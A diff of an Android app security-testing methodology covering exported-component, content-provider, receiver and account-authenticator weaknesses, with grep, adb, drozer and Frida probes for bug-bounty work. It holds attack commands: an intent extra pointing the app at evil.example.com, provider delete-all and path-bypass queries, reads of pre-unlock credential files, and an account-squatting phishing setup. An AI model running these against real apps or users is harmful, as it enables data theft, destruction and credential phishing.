 ### D03-029 · `getCallingPackage()` / `getCallingActivity()` null-handling used as authorisation
@@ -833,12 +896,13 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | `developer.android.com/privacy-and-security/risks/intent-redirection` — documented common mistake: treating a non-null `getCallingActivity()` as proof of a trusted caller, *"malicious apps can supply null"*; `risks/access-control-to-exported-components` |
 
 - **Test:** `getCallingPackage()` and `getCallingActivity()` are populated only when the caller used `startActivityForResult()`. A plain `startActivity()` makes them **null**, and the app's check either silently passes or falls into a default-allow branch. Test both invocation styles.
 - **How:**
   ```bash
-  grep -rnE 'getCallingPackage\(\)|getCallingActivity\(\)|getReferrer\(\)' sources/ -A8
+  grep -rnE 'getCallingPackage\(\)|getCallingActivity\(\)|getReferrer\(\)' $SRC/ -A8
   ```
   From the PoC app, call the activity both ways and log which branch executes:
   ```java
@@ -846,10 +910,10 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
   startActivityForResult(i, 1);      // getCallingActivity() == your component
   ```
   ```bash
-  adb shell am start -n com.target/.SecureActivity --es token AAA    # the null-caller path
+  adb shell am start -S -W -n com.target/.SecureActivity --es token AAA    # the null-caller path
   ```
 - **Proof:** The privileged branch executing under one of the two invocation styles from an untrusted package — typically the activity performing the action when launched with a null caller and refusing when launched with a named, non-allow-listed one. Log the branch taken; that inversion is the finding.
-- **Escalation:** -> D04 exported-activity abuse with attacker extras; -> D13/D15 if the branch issues or forwards a session.
+- **Escalation:** Dynamic owner: D04-026 / D06-019 / D07-023 per component type runs the probe — record the manifest/permission fact here and hand the runtime half over, do not run it twice. -> D04 exported-activity abuse with attacker extras; -> D13/D15 if the branch issues or forwards a session.
 - **Ruled out when:** The code treats `null` as deny, and where it does accept a named caller it verifies the caller's **signing certificate** (`PackageManager.getPackageInfo(pkg, GET_SIGNING_CERTIFICATES)` / `hasSigningCertificate`) rather than the name.
 
 ### D03-030 · Package-name substring / prefix matching used as a trust boundary
@@ -860,12 +924,13 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | H1 **#331302** (Nextcloud, Low); correct alternative is `PackageManager.getPackageInfo(..., GET_SIGNING_CERTIFICATES)` or a `signature`-level permission |
 
 - **Test:** `contains()`, `startsWith()`, `endsWith()` and `indexOf()` on a caller's package name are trivially satisfiable — the attacker chooses their own `applicationId`.
 - **How:**
   ```bash
-  grep -rn 'getNameForUid\|getCallingPackage\|getPackagesForUid' sources/ -A6 \
+  grep -rn 'getNameForUid\|getCallingPackage\|getPackagesForUid' $SRC/ -A6 \
     | grep -nE 'contains|startsWith|endsWith|indexOf|matches'
   ```
   The disclosed Nextcloud shape, verbatim from the report:
@@ -891,6 +956,7 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `broken_access_control.privilege_escalation` (null); files to P1 when the delegated read yields another user's data via `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | Oversecured "Insufficient permission protection" (the canonical example: reading `ContactsContract.CommonDataKinds.Phone` requires `READ_CONTACTS`, but the app's own `content://com.exampleapp.contacts` requires nothing); `developer.android.com/privacy-and-security/security-tips` — *"don't leak permission-protected data ... permission re-delegation"*; MASWE-0018; H1 **#97295** (ok.ru), **#1161401** (Nextcloud, Low 1.3, $250), **#185862** (Twitter location, $560); ATT&CK T1636.001–.005 |
 
 - **Test:** Cross-reference every dangerous permission the app holds against the exported components that surface that data or perform that action. An exported component that does permission-gated work with attacker-supplied parameters lets a zero-permission app borrow the grant — INTERNET, CONTACTS, LOCATION, CAMERA, SMS, CALL_LOG.
@@ -899,10 +965,10 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
   aapt2 dump permissions base.apk | sed 's/^.*name=//' | sort
   adb shell dumpsys package $PKG | sed -n '/requested permissions/,/install permissions/p'
   # find the consumers
-  grep -rnE 'ContactsContract|CallLog\.Calls|Telephony\.Sms|CalendarContract|AccountManager\(|getAccounts\(|LocationManager|FusedLocationProviderClient|SmsManager' sources/
+  grep -rnE 'ContactsContract|CallLog\.Calls|Telephony\.Sms|CalendarContract|AccountManager\(|getAccounts\(|LocationManager|FusedLocationProviderClient|SmsManager' $SRC/
   # then, from the ZERO-permission PoC app:
   adb shell content query --uri content://com.target.contacts
-  adb shell am start -n com.target/.ExportedActivity --es server evil.example.com
+  adb shell am start -S -W -n com.target/.ExportedActivity --es server evil.example.com
   ```
   The ok.ru shape passed an attacker-supplied host into a REST builder:
   ```java
@@ -921,13 +987,14 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
 | **Attacker** | AM-03 / AM-04 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | `developer.android.com/guide/topics/manifest/service-element`, `.../receiver-element` — if `android:permission` is unset on the component, the `<application>` element's value applies; if neither is set *"the service isn't protected by a permission"*; MobSF `exported_protected_permission_normal_app_level`, `exported_protected_permission_not_defined_app_level` |
 
 - **Test:** Developers set `android:permission` once on `<application>` and believe it is a floor. It is not — a per-component `android:permission` **replaces** it. One component declaring a weaker (or orphan, or misspelled) permission silently drops out of the application-wide guard.
 - **How:**
   ```bash
-  grep -n -A3 '<application' merged.xml | grep -i permission
-  grep -nE '<(service|receiver|activity|activity-alias|provider)[^>]*android:(permission|readPermission|writePermission)' merged.xml
+  grep -n -A3 '<application' "$M" | grep -i permission
+  grep -nE '<(service|receiver|activity|activity-alias|provider)[^>]*android:(permission|readPermission|writePermission)' "$M"
   ```
   Then resolve each per-component value's protection level via D03-009's cross-join and compare it with the application-level one.
 - **Proof:** A component whose own `android:permission` resolves to a weaker level (or to nothing) while `<application>` carries a stronger one, plus an invocation succeeding while holding only the weaker permission.
@@ -948,15 +1015,15 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 - **Test:** An alias can be `exported="true"` with no `android:permission` while its `targetActivity` is `exported="false"` and permission-protected. Tooling and developers both routinely skip aliases.
 - **How:**
   ```bash
-  xmllint --format merged.xml | grep -n -A10 '<activity-alias'
+  xmllint --format "$M" | grep -n -A10 '<activity-alias'
   # launch the ALIAS name, not the target
-  adb shell am start -n com.target.app/.AliasName
-  adb shell am start -n com.target.app/.InternalActivity    # control: expect Permission Denial
+  adb shell am start -S -W -n com.target.app/.AliasName
+  adb shell am start -S -W -n com.target.app/.InternalActivity    # control: expect Permission Denial
   # drozer
   #   run app.activity.start --component com.target.app com.target.app.AliasName
   ```
 - **Proof:** The target activity's UI appearing after launching the *alias* class name, while launching the target class name directly returns `java.lang.SecurityException: Permission Denial`. That delta is the whole finding.
-- **Escalation:** Whatever the internal activity does, now reachable unauthenticated -> D04 parameter tampering, D08 intent redirection.
+- **Escalation:** Dynamic owner: D04-003 runs the probe — record the manifest/permission fact here and hand the runtime half over, do not run it twice. Whatever the internal activity does, now reachable unauthenticated -> D04 parameter tampering, D08 intent redirection.
 - **Ruled out when:** No `<activity-alias>` exists, or every alias carries `android:exported="false"`, or carries the same `android:permission` as its target (verified to be an enforceable level under D03-005).
 
 ### D03-034 · `android:exported="true"` written to satisfy the targetSdk 31 build
@@ -973,9 +1040,9 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 - **Test:** Since Android 12 an intent-filtered component cannot install without an explicit `android:exported`. The pre-12 bug class ("forgot to set it") is dead on modern targets; the live class is "wrote `true` to make the build pass, on a component that was never meant to be public". Demand a cross-app justification for every `true`.
 - **How:**
   ```bash
-  grep -nB2 -A8 'android:exported="true"' merged.xml
+  grep -nB2 -A8 'android:exported="true"' "$M"
   # probe each, both bare and with the filter's action
-  adb shell am start -n com.target.app/.SomeActivity
+  adb shell am start -S -W -n com.target.app/.SomeActivity
   adb shell am start -a com.target.ACTION_X -n com.target.app/.SomeActivity --es token AAA
   adb shell am startservice -n com.target.app/.SomeService
   adb shell am broadcast -n com.target.app/.SomeReceiver --es payload AAA
@@ -999,14 +1066,14 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 - **Test:** `android:path` matches the **exact** path only. A provider whose permission is scoped with `android:path` leaves every child URI ungated.
 - **How:**
   ```bash
-  grep -n 'android:path=' merged.xml
+  grep -n 'android:path=' "$M"
   # probe the children of each declared path from the zero-permission PoC app
   adb shell content query --uri content://com.target.provider/protected            # expect denial
   adb shell content query --uri content://com.target.provider/protected/child      # the gap
   adb shell content query --uri content://com.target.provider/protected/1
   ```
 - **Proof:** `content query` on `…/protected/child` returning rows while `…/protected` is denied — the pair of outputs proves the guard does not cover the subtree.
-- **Escalation:** -> D07 provider data extraction.
+- **Escalation:** Dynamic owner: D07-020 runs the probe — record the manifest/permission fact here and hand the runtime half over, do not run it twice. -> D07 provider data extraction.
 - **Ruled out when:** Every path-scoped element uses `pathPrefix` or `pathPattern` with coverage you have verified by probing at least three children and one sibling of each declared path, all denied.
 
 ### D03-036 · `<path-permission>` coverage gap and `<grant-uri-permission>` scoped to the whole provider
@@ -1023,8 +1090,8 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 - **Test:** Two halves. (a) Any path **not** matched by a `<path-permission>` falls back to the provider-level permission — and if that is absent, to nothing. Path matching supports `path`, `pathPrefix`, `pathPattern`, `pathSuffix`, `pathAdvancedPattern`; normalisation variants slip past them. (b) `<grant-uri-permission android:pathPrefix="/">` (or `path="/"`, `pathPattern="*"`) converts a narrow, single-URI grant into whole-provider access for anyone who receives any grant.
 - **How:**
   ```bash
-  xmllint --format merged.xml | sed -n '/<provider/,/<\/provider>/p'
-  grep -B3 -A3 'grant-uri-permission' merged.xml
+  xmllint --format "$M" | sed -n '/<provider/,/<\/provider>/p'
+  grep -B3 -A3 'grant-uri-permission' "$M"
   # for each <path-permission>, find a URI it does NOT match but the provider still serves
   adb shell content query --uri content://AUTH/protected            # expect denial
   adb shell content query --uri content://AUTH//protected           # double slash
@@ -1033,7 +1100,7 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
   adb shell content query --uri content://AUTH/protected/../protected
   ```
 - **Proof:** One normalisation variant returning rows while the canonical path returns `Permission Denial` — the pair of outputs is the finding. For (b): the PoC app receives a grant for one benign URI and then successfully `openInputStream()`s an unrelated URI under the same authority.
-- **Escalation:** -> D07 full provider read; -> D08, where an over-broad `grant-uri-permission` is the multiplier that turns a single intent redirect into "read anything the app can read".
+- **Escalation:** Dynamic owner: D07-021 / D07-024 runs the probe — record the manifest/permission fact here and hand the runtime half over, do not run it twice. -> D07 full provider read; -> D08, where an over-broad `grant-uri-permission` is the multiplier that turns a single intent redirect into "read anything the app can read".
 - **Ruled out when:** Every `<grant-uri-permission>` names a specific `pathPrefix` narrower than `/`, and every `<path-permission>`-covered path denies all five normalisation variants above.
 
 ### D03-037 · Provider declares `readPermission` but omits `writePermission`
@@ -1050,7 +1117,7 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 - **Test:** Splitting `android:readPermission` and `android:writePermission` creates a gap: a provider that declares only a read permission accepts `insert`/`update`/`delete` from any app. It gets worse when the implementation ignores the requested access mode.
 - **How:**
   ```bash
-  grep -E '<provider' -A8 merged.xml | grep -E 'authorities|readPermission|writePermission|exported|grantUriPermissions'
+  grep -E '<provider' -A8 "$M" | grep -E 'authorities|readPermission|writePermission|exported|grantUriPermissions'
   adb shell content insert --uri content://com.target.provider/items --bind name:s:pwnedmarker7x
   adb shell content delete --uri content://com.target.provider/items --where "1=1"
   adb shell content query  --uri content://com.target.provider/items
@@ -1067,18 +1134,19 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `broken_access_control.privilege_escalation` (null) |
 | **Attacker** | AM-08 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | `developer.android.com/guide/topics/manifest/service-element`, `.../activity-element`, `.../receiver-element` (`android:process`, `android:isolatedProcess` — documented as running *"under a special isolated process with no permissions of its own"*) |
 
 - **Test:** An `android:process` value beginning with a lowercase letter (no leading `:`) puts the component in a **global** shared process; components from different apps sharing a global process share an address space. A `:`-prefixed value is private. Separately, a service that parses untrusted input (media, archives, model files) and does **not** set `isolatedProcess="true"` runs that parser with the app's full permission set.
 - **How:**
   ```bash
-  grep -nE 'android:process="' merged.xml
-  grep -nE 'android:isolatedProcess' merged.xml
+  grep -nE 'android:process="' "$M"
+  grep -nE 'android:isolatedProcess' "$M"
   adb shell ps -A | grep com.target        # one line per process; compare names across packages
   adb shell ps -Z | grep com.target        # SELinux context per process
   ```
 - **Proof:** A process name with no leading `:` shared between two packages in `ps -A` output; or a native parser service running in the main process (`ps -A` showing a single PID) while handling attacker-supplied bytes.
-- **Escalation:** A compromise in the less-trusted component now runs in the more-trusted one's process -> D16 native memory safety with the app's full grant set. Combined with `sharedUserId` (D03-067) it is code from app B executing inside app A's process.
+- **Escalation:** Dynamic owner: D06-004 (D06-067, D16-055, D08-031 for the boundary itself) runs the probe — record the manifest/permission fact here and hand the runtime half over, do not run it twice. A compromise in the less-trusted component now runs in the more-trusted one's process -> D16 native memory safety with the app's full grant set. Combined with `sharedUserId` (D03-067) it is code from app B executing inside app A's process.
 - **Ruled out when:** Every `android:process` value is either absent or `:`-prefixed, and every service that parses untrusted input declares `android:isolatedProcess="true"`.
 
 ### D03-039 · `android:directBootAware="true"` — components that run before the user unlocks
@@ -1095,36 +1163,38 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 - **Test:** A Direct-Boot-aware component can run before the user unlocks and can only touch *device-protected* storage during Direct Boot. A `directBootAware` component that reads credentials therefore implies those credentials live outside the file-based-encryption credential key.
 - **How:**
   ```bash
-  grep -nE 'directBootAware="true"' merged.xml
-  grep -rnE 'createDeviceProtectedStorageContext|moveSharedPreferencesFrom|moveDatabaseFrom|isUserUnlocked' sources/
+  grep -nE 'directBootAware="true"' "$M"
+  grep -rnE 'createDeviceProtectedStorageContext|moveSharedPreferencesFrom|moveDatabaseFrom|isUserUnlocked' $SRC/
   # on a rooted lab device, before unlock:
   adb shell ls -la /data/user_de/0/com.target.app/
   adb shell cat /data/user_de/0/com.target.app/shared_prefs/*.xml
   ```
 - **Proof:** A `directBootAware` component plus a `createDeviceProtectedStorageContext()` write of a token or key, read back from `/data/user_de/0/<pkg>/` **before** the device is unlocked.
-- **Escalation:** -> D11 (pre-unlock credential extraction), D13 (session takeover from a locked device).
+- **Escalation:** Dynamic owner: D04-057 / D05-059 runs the probe — record the manifest/permission fact here and hand the runtime half over, do not run it twice. -> D11 (pre-unlock credential extraction), D13 (session takeover from a locked device).
 - **Ruled out when:** No component declares `directBootAware="true"`; or the device-protected storage context is used only for non-sensitive bootstrapping (a locale, a feature flag) and `/data/user_de/0/<pkg>/` contains no credential material at the pre-unlock state.
 
-### D03-040 · Context-registered receivers are invisible to manifest analysis — and `RECEIVER_NOT_EXPORTED` is mandatory from API 33
+### D03-040 · Context-registered receivers are invisible to manifest analysis — and an export flag is mandatory for apps targeting Android 14 (API 34)
 
 | | |
 |---|---|
 | **Severity ceiling** | **High** |
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
 | **Attacker** | AM-03 |
-| **Applies to** | all; the `RECEIVER_EXPORTED`/`RECEIVER_NOT_EXPORTED` requirement applies to apps targeting **Android 13 (API 33)+** for non-system broadcasts |
+| **Applies to** | all. `RECEIVER_EXPORTED`/`RECEIVER_NOT_EXPORTED` exist from Android 13 (API 33) and are **required** for non-system broadcasts when the app targets **API 34+** (registration throws `SecurityException` without one). Below targetSdk 34 a flagless `registerReceiver` is exported by default — that is the bug shape. (D22-030 owns the targetSdk-34 gate; D05-004 the legacy default.) |
+| **Requires** | — |
 | **Maps to** | MASTG-TECH-0162, verbatim: *"receivers created at runtime are registered by calling `Context.registerReceiver` ... search the reverse-engineered code for calls to `registerReceiver` and for subclasses of `BroadcastReceiver` ... check whether the call specifies `RECEIVER_NOT_EXPORTED`, which since Android 13 (API level 33) prevents other apps from delivering broadcasts to the receiver"* |
 
 - **Test:** Receivers created with `Context.registerReceiver` appear in neither the manifest nor `drozer app.broadcast.info`. A D03-003 table built from the manifest alone is incomplete by exactly this set.
 - **How:**
   ```bash
-  grep -rnE 'registerReceiver|RECEIVER_NOT_EXPORTED|RECEIVER_EXPORTED' sources/
+  grep -rnE 'registerReceiver|RECEIVER_NOT_EXPORTED|RECEIVER_EXPORTED' $SRC/
   ```
-  Runtime enumeration:
+  Runtime enumeration — the platform's own list of context-registered receivers, per process, with filters and exported state (`objection android hooking list receivers` lists *manifest* receivers via PackageManager and is useless here):
+  ```bash
+  adb shell dumpsys activity broadcasts | sed -n '/Registered Receivers:/,/^$/p' | grep -B2 -A8 com.target.app
+  adb shell dumpsys activity broadcasts | grep -A6 'ReceiverList.*com.target.app' | grep -E 'Filter|Action|exported'
   ```
-  objection -g com.target.app explore
-  android hooking list receivers
-  ```
+  Keep the Frida hook for attribution (which class registered what):
   ```javascript
   Java.perform(function () {
     var C = Java.use('android.app.ContextImpl');   // NOT android.content.Context — that is abstract
@@ -1136,9 +1206,9 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
     });
   });
   ```
-- **Proof:** A `registerReceiver` call logged with an app-specific `IntentFilter` action and **no** `RECEIVER_NOT_EXPORTED` flag on an API 33+ target, then `adb shell am broadcast -a <action> --es key value` from the PoC app reaching it and producing the observed state change.
-- **Escalation:** -> D05 broadcast injection. Runtime receivers handling session refresh, config update or payment confirmation on attacker-supplied extras are the payable shape.
-- **Ruled out when:** Every `registerReceiver` call on an API 33+ target passes `RECEIVER_NOT_EXPORTED`, or registers only protected system broadcasts, or uses `LocalBroadcastManager`/the app's own `ContextCompat.registerReceiver` with the not-exported flag.
+- **Proof:** A `registerReceiver` call logged with an app-specific `IntentFilter` action and **no** `RECEIVER_NOT_EXPORTED` flag (the `dumpsys activity broadcasts` row showing the filter with `exported=true`), then `adb shell am broadcast -a <action> --es key value` from the PoC app reaching it and producing the observed state change.
+- **Escalation:** Dynamic owner: D05-004 / D22-030 runs the probe — record the manifest/permission fact here and hand the runtime half over, do not run it twice. -> D05 broadcast injection. Runtime receivers handling session refresh, config update or payment confirmation on attacker-supplied extras are the payable shape.
+- **Ruled out when:** targetSdk ≥ 34 (the platform refuses flagless registration) and every call for an app-specific action passes `RECEIVER_NOT_EXPORTED`; or targetSdk < 34 and every flagless call registers only protected system broadcasts, or uses `LocalBroadcastManager`/the app's own `ContextCompat.registerReceiver` with the not-exported flag. Registration may be feature-flag-gated: capture the `dumpsys activity broadcasts` listing on the tested build **after exercising the feature**, and mark the negative as build/flag-specific.
 
 ### D03-041 · Dialler secret-code receivers (`android.provider.Telephony.SECRET_CODE`)
 
@@ -1154,13 +1224,13 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 - **Test:** A `SECRET_CODE` receiver exposes app functionality to anyone who can type `*#*#<code>#*#*` into the dialler — usually engineering menus, log dumps or factory-test screens. It is also reachable as an ordinary broadcast.
 - **How:**
   ```bash
-  grep -n -A6 'android.provider.Telephony.SECRET_CODE' merged.xml
+  grep -n -A6 'android.provider.Telephony.SECRET_CODE' "$M"
   # drozer
   #   run scanner.misc.secretcodes com.target.app
   adb shell am broadcast -a android.provider.Telephony.SECRET_CODE -d android_secret_code://12345
   ```
 - **Proof:** The broadcast opening an engineering/debug screen, or writing a diagnostic file containing device identifiers, logs or credentials — screenshot plus the file contents.
-- **Escalation:** Combine with tapjacking (D04) to get the user to dial it, or with an exported proxy component to fire the broadcast from an attacker app -> D05.
+- **Escalation:** Dynamic owner: D01-049 (D25-045 for OEM menus) runs the probe — record the manifest/permission fact here and hand the runtime half over, do not run it twice. Combine with tapjacking (D04) to get the user to dial it, or with an exported proxy component to fire the broadcast from an attacker app -> D05.
 - **Ruled out when:** No receiver declares the `SECRET_CODE` action, or the reachable screen renders only static build metadata already published in the app's About page.
 
 ### D03-042 · Accessory intent filters (USB / NFC) — exported by necessity, therefore audit them as exported components
@@ -1177,11 +1247,11 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 - **Test:** An activity carrying these filters **must** be exported — the system delivers the intent — and usually carries no `android:permission`. Testers skip them because they look like hardware plumbing, but a zero-permission app can `am start` them with forged extras.
 - **How:**
   ```bash
-  grep -n -B4 -A10 'USB_DEVICE_ATTACHED\|USB_ACCESSORY_ATTACHED\|NDEF_DISCOVERED\|TECH_DISCOVERED\|TAG_DISCOVERED' merged.xml
+  grep -n -B4 -A10 'USB_DEVICE_ATTACHED\|USB_ACCESSORY_ATTACHED\|NDEF_DISCOVERED\|TECH_DISCOVERED\|TAG_DISCOVERED' "$M"
   adb shell am start -a android.hardware.usb.action.USB_DEVICE_ATTACHED -n com.target.app/.UsbActivity
   adb shell am start -a android.nfc.action.NDEF_DISCOVERED -n com.target.app/.NfcActivity --es payload 'A'
   # does the handler trust the parcelable without a null check, and where does the payload go?
-  grep -rnE 'UsbManager\.EXTRA_(DEVICE|ACCESSORY|PERMISSION_GRANTED)|NfcAdapter\.EXTRA_(TAG|NDEF_MESSAGES|ID)' sources/ -A10
+  grep -rnE 'UsbManager\.EXTRA_(DEVICE|ACCESSORY|PERMISSION_GRANTED)|NfcAdapter\.EXTRA_(TAG|NDEF_MESSAGES|ID)' $SRC/ -A10
   ```
 - **Proof:** The activity starting and processing your forged extras from the zero-permission PoC app — the handler's own log line in logcat, or a crash stack proving an unchecked `getParcelableExtra()`, or the NDEF payload appearing as a URI in a router/WebView/file sink.
 - **Escalation:** -> D09 if the payload is a URI reaching a deep-link router; -> D10 if it reaches a WebView; -> D25 for accessory-driven chains. Crash-only stays P5 — say so.
@@ -1195,22 +1265,23 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) once harvested credentials complete an ATO; the primitive alone files under `broken_access_control.exposed_sensitive_android_intent` (null) |
 | **Attacker** | AM-03 (install order matters — demonstrate it and state it) |
 | **Applies to** | all Android versions for the squatting itself |
+| **Requires** | — |
 | **Maps to** | `developer.android.com/about/versions/oreo/android-8.0-changes`, verbatim: *"in Android 8.0 (API level 26), apps can no longer get access to user accounts unless the authenticator owns the accounts or the user grants that access. The `GET_ACCOUNTS` permission is no longer sufficient."* — which is exactly why owning the *type* is the prize |
 
 - **Test:** If the app declares an account authenticator, the `android:accountType` string is claimed **first-installer-wins** and is not signature-bound by the manifest alone. A malicious app declaring the same type and installed first owns it: the target's `AccountManager.addAccount(type, …)` routes to the attacker's authenticator activity, which renders a pixel-perfect login **inside the target's own task** — no overlay, so `FLAG_SECURE` and overlay-hiding do not help.
 - **How:**
   ```bash
-  grep -rn 'accountType\|AbstractAccountAuthenticator\|account-authenticator' merged.xml out/res/xml/ sources/
-  cat out/res/xml/authenticator.xml
+  grep -rn 'accountType\|AbstractAccountAuthenticator\|account-authenticator' "$M" $RES/xml/ $SRC/
+  cat $RES/xml/authenticator.xml
   adb shell dumpsys account | grep -A5 '<the account type>'
   ```
-  Attacker app: copy `authenticator.xml` verbatim (same `accountType`, `label`, `icon`), install it first, then trigger the target's sign-in flow or call from a third app:
+  Attacker app: copy `authenticator.xml` verbatim (same `accountType`, `label`, `icon`) **and** declare `<queries><package android:name="<target>"/></queries>` plus `<queries><intent><action android:name="android.accounts.AccountAuthenticator"/></intent></queries>` in the squatter — `AccountManagerService` filters account visibility by package visibility, so a targetSdk ≥ 30 squatter without them cannot even observe the account it is competing for. Install it first, then trigger the target's sign-in flow or call from a third app:
   ```java
   AccountManager.get(ctx).addAccount("<type>", null, null, null, activity, cb, null);
   ```
 - **Proof:** `dumpsys account` attributing the account type to the attacker package, plus a screenshot of the attacker's activity rendered when the target app's "sign in" is tapped.
 - **Escalation:** Harvested credentials -> D13 full ATO. The attacker authenticator can also return a `KEY_INTENT` launching an arbitrary component in the caller's context -> D08 intent redirection.
-- **Ruled out when:** The app declares no `<account-authenticator>`; or installing the squatter first causes the target's own authenticator to win (`dumpsys account` still names the target) on every API level in the app's range. Record the install order in the PoC — triage will ask.
+- **Ruled out when:** The app declares no `<account-authenticator>`; or — the squatter having declared `<queries>` for the target and for the authenticator action (quote the block) — installing it first still causes the target's own authenticator to win (`dumpsys account` still names the target) on every API level in the app's range. Record the install order in the PoC — triage will ask.
 
 ### D03-044 · `android:intentMatchingFlags` — `"none"` is an explicit opt-*out* of Android 16 intent hardening
 
@@ -1219,23 +1290,28 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **Severity ceiling** | **High** (when the exempt component routes an arbitrary URI); Medium standalone |
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
 | **Attacker** | AM-03 |
-| **Applies to** | **Android 16 (API 36)+.** Settable on `<application>`, `<activity>`, `<activity-alias>`, `<receiver>`, `<service>`, `<provider>`. |
+| **Applies to** | **Android 16 (API 36)+ devices**, and the enforcement is keyed on the *receiving* app (its targetSdk, or an explicit `android:intentMatchingFlags` opt-in). Settable on `<application>`, `<activity>`, `<activity-alias>`, `<receiver>`, `<service>`, `<provider>`; only components that declare at least one `<intent-filter>` are subject. Intents from shell, root or system senders are **not** valid controls in either direction — an engagement observed explicit broadcasts with a non-matching or null action delivered from `adb shell` on an API 36 device. |
 | **Requires** | api>=36, targetsdk>=36 |
 | **Maps to** | `developer.android.com/about/versions/16/behavior-changes-16` — values `enforceIntentFilter` / `none` / `allowNullAction`; the documented logcat filter is `tag:PackageManager & (message:"Intent does not match component's intent filter:" | message:"Access blocked:")` |
 
 - **Test:** Three sub-cases. (a) `intentMatchingFlags="none"` **disables all special matching rules and takes precedence** — a component carrying it is explicitly de-hardened. (b) `allowNullAction` re-permits action-less intents. (c) A manifest can set `enforceIntentFilter` on `<application>` and look hardened while one externally reachable component sets `none`, restoring pre-16 behaviour for that component only — that component is then the single surviving entry point on an otherwise hardened app.
 - **How:**
   ```bash
-  grep -nE 'intentMatchingFlags' merged.xml
-  # send an explicit intent that does NOT match the declared filter
-  adb shell am start -W -n com.target/.EntryActivity -a com.attacker.UNEXPECTED -d 'https://wrong.example/'
-  adb shell am start -W -n com.target/.EntryActivity          # null action
-  adb shell am broadcast -n com.target.app/.MyBroadcastReceiver --es payload pwnmark7x
-  adb logcat -s PackageManager | grep -E "Intent does not match component's intent filter:|Access blocked:"
+  grep -nE 'intentMatchingFlags' "$M"
+  # the sender MUST be the zero-permission probe (D03-006) — shell/root senders are not subject to the check
+  P=com.sanehunters.probe/.MainActivity
+  # 1. positive control: a MATCHING action to a filtered component must be delivered
+  adb shell am start -S -a probe.fire.1 -n $P --es run start --es component com.target.app/.EntryActivity --es action android.intent.action.VIEW --es data "https://expected.example/"
+  # 2. the test: a non-matching action, then a null action, to the SAME component
+  adb shell am start -S -a probe.fire.2 -n $P --es run start --es component com.target.app/.EntryActivity --es action com.attacker.UNEXPECTED --es data "https://wrong.example/"
+  adb shell am start -S -a probe.fire.3 -n $P --es run start --es component com.target.app/.EntryActivity
+  # 3. repeat per component type — enforcement is implemented per resolver path (activity / receiver / service)
+  adb shell am start -S -a probe.fire.4 -n $P --es run broadcast --es component com.target.app/.MyBroadcastReceiver --es action com.attacker.UNEXPECTED --es extras "payload:s=pwnmark7x"
+  adb logcat -d -s PackageManager ActivityTaskManager | grep -E "Intent does not match component's intent filter:|Access blocked:"
   ```
-- **Proof:** With strict matching in force the framework blocks the call and `PackageManager` logs `Intent does not match component's intent filter:` (observed on-device as `result code=-92 / Access blocked`); with `none` the handler's `onReceive`/`onCreate` runs and the block message is **absent** (`result code=3 / delivered`). The pair of logcat outputs, taken on the same device, is the evidence.
+- **Proof:** Three probe transcripts per component type (match / mismatch / null action) taken on the same device: with strict matching in force the framework blocks the mismatched call and `PackageManager` logs `Intent does not match component's intent filter:` (observed on-device as `result code=-92 / Access blocked`), while the matching control is delivered; with `none` the handler's `onReceive`/`onCreate` runs for the mismatch too and the block message is **absent** (`result code=3 / delivered`). A shell-sent intent transcript is not evidence in either direction.
 - **Escalation:** Route every D08 payload through the exempt component. Absence of `enforceIntentFilter` on an exported component that forwards `getIntent()` data is the defence-in-depth half — on its own it is Low, but it is what lets a local app inject an arbitrary URI (any host, `javascript:`, `data:`) into a Flutter/React Native `MainActivity` router that a browser could only reach through autoVerify'd hosts -> D09 -> D10.
-- **Ruled out when:** The target is below API 36 (the attribute has no effect — say so rather than reporting its absence), or `<application>` sets `enforceIntentFilter` and **no** component overrides it with `none`/`allowNullAction`, confirmed by the block message appearing for every mismatched explicit intent you send. **Sibling comparison is the strongest argument here:** a sibling app in the same family that sets `enforceIntentFilter` proves the absent one is a defect, not a design choice.
+- **Ruled out when:** The target is below API 36 (the attribute has no effect — say so rather than reporting its absence), or `<application>` sets `enforceIntentFilter` and **no** component overrides it with `none`/`allowNullAction`, confirmed by the block message appearing for every mismatched explicit intent the **probe** sends — a mismatch observed only from `adb shell` rules nothing in or out. **Sibling comparison is the strongest argument here:** a sibling app in the same family that sets `enforceIntentFilter` proves the absent one is a defect, not a design choice.
 
 ### D03-045 · `resolveActivity() == null` used as a security gate — the package-visibility trap
 
@@ -1248,18 +1324,21 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **Requires** | targetsdk>=30 |
 | **Maps to** | `developer.android.com/training/package-visibility` (filtering of `queryIntentActivities`, `getPackageInfo`, `getInstalledApplications`, and service binding); MASWE-0047 (Using Non-Standard APIs for Security-Critical Functionality) |
 
